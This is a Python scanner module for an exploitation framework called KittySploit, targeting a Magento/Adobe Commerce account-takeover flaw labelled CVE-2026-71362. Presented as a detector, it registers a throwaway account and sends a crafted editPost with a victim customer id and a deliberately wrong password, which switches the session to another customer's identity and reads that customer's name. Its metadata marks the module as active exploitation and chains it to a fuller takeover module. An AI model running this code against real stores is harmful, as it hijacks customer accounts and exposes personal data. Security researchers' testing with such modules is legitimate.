#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Magento/Adobe Commerce CVE-2026-71362 customer session identity switch."""

import html
import re
import secrets
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Magento CVE-2026-71362 Account Takeover Detect",
        "description": (
            "Detects CVE-2026-71362 in Adobe Commerce / Magento Open Source before the "
            "APSB26-92 August 2026 patch: failed customer editPost poisons "
            "customer_form_data and mass-assigns id into the active session. "
            "Registers a throwaway account and attempts a benign identity switch."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-71362"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-71362",
            "https://helpx.adobe.com/security/products/magento/apsb26-92.html",
        ],
        "modules": ["auxiliary/admin/http/magento_cve_2026_71362_account_takeover"],
        "tags": [
            "web",
            "scanner",
            "magento",
            "adobe-commerce",
            "auth-bypass",
            "account-takeover",
            "cve-2026-71362",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.5,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["magento", "adobe-commerce"],
                "endpoint_pattern_any": ["/customer/account/"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "auth_bypass", "from_detail": "session id switch"},
                    {"capability": "account_takeover", "from_detail": "customer PII"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/magento_cve_2026_71362_account_takeover",
                ],
            },
        },
    }

    probe_customer_id = OptInteger(
        1,
        "Customer entity id to attempt switching the session to",
        False,
        advanced=True,
    )

    @staticmethod
    def _form_key(body: str) -> str:
        match = re.search(r'name="form_key"[^>]*value="([^"]+)"', body or "")
        return match.group(1) if match else ""

    def _is_magento(self) -> bool:
        for path in ("/customer/account/login", "/"):
            response = self.http_request(method="GET", path=path, allow_redirects=True)
            if not response:
                continue
            headers = " ".join(f"{k}:{v}" for k, v in (response.headers or {}).items()).lower()
            body = (response.text or "").lower()
            if "magento" in headers or "magento" in body or "x-magento" in headers:
                return True
        return False

    def _register(self, email: str, password: str):
        create = self.http_request(method="GET", path="/customer/account/create", allow_redirects=True)
        if not create:
            return False
        fk = self._form_key(create.text or "")
        if not fk:
            return False
        post = self.http_request(
            method="POST",
            path="/customer/account/createPost",
            data={
                "form_key": fk,
                "firstname": "Kitty",
                "lastname": "Probe",
                "email": email,
                "password": password,
                "password_confirmation": password,
            },
            allow_redirects=True,
        )
        return bool(post)

    def _identity_firstname(self) -> str:
        response = self.http_request(
            method="GET",
            path="/customer/section/load",
            params={"sections": "customer", "force_new_section_timestamp": str(time.time())},
            headers={"X-Requested-With": "XMLHttpRequest"},
            allow_redirects=False,
        )
        if not response:
            return ""
        try:
            payload = response.json()
            return str((payload.get("customer") or {}).get("firstname") or "")
        except Exception:
            return ""

    def _switch_session(self, email: str, victim_id: int) -> bool:
        edit = self.http_request(method="GET", path="/customer/account/edit", allow_redirects=True)
        if not edit:
            return False
        fk = self._form_key(edit.text or "")
        if not fk:
            return False
        baseline = self._identity_firstname()
        self.http_request(
            method="POST",
            path="/customer/account/editPost",
            data={
                "form_key": fk,
                "id": str(victim_id),
                "change_email": "1",
                "current_password": "wrong-password-forces-exception",
                "email": email,
                "firstname": "Kitty",
                "lastname": "Probe",
            },
            allow_redirects=False,
        )
        self.http_request(method="GET", path="/customer/account/edit", allow_redirects=False)
        current = self._identity_firstname()
        if not current or current == baseline:
            edit_body = (edit.text or "")
            match = re.search(r'id="firstname"[^>]*value="([^"]*)"', edit_body)
            if match:
                leaked = html.unescape(match.group(1))
                if leaked and leaked not in ("Kitty", baseline):
                    return True
        return bool(current and current != baseline and current != "Kitty")

    def run(self):
        if not self._is_magento():
            return False
        stamp = secrets.token_hex(4)
        email = f"kitty71362-{stamp}@example.test"
        password = f"KittyProbe#{stamp}"
        if not self._register(email, password):
            return False
        if self._switch_session(email, int(self.probe_customer_id or 1)):
            self.set_info(
                severity="critical",
                cve="CVE-2026-71362",
                reason="Customer session identity switch succeeded",
                customer_id=int(self.probe_customer_id or 1),
            )
            return True
        return False
